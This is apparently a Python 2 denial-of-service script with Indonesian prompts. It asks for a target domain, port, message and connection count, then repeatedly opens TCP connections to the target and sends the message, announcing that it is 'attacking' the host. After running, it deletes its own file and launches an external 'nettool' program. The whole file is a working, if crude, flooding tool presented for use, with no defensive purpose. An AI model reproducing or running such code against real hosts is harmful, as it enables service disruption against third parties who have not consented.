import time
import socket
import os
import sys
import string
def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
curdir = os.getcwd()
print ("")
host=raw_input( "Domain: " )
port=input( "Port: " )
message=raw_input( "Pesan: " )
conn=input( "Berapa koneksi: " )
ip = socket.gethostbyname( host )
print ( "IP " + ip + " dikunci" )
print ( "Menyerang " + host )
print ("================")
print ("")
def dos():
    #pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("Koneksi Gagal")
    print ("    BOOOOMMM")
    ddos.close()
for i in range(1, conn):
    dos()
print ("")
print ("================")
print("Koneksi yang diminta selesai")
if __name__ == "__main__":
    answer = raw_input("Lagi (y), Kembali (t)? ")
    if answer.strip() in "y Y yes Yes YES ya Ya YA".split():
        restart_program()
    elif answer.strip() in "t T tidak Tidak TIDAK".split():
        os.remove("/data/lognettool/ddos1.py")
        os.system("/system/bin/nettool")
    else:
        os.remove("/data/lognettool/ddos1.py")
        os.system("/system/bin/nettool")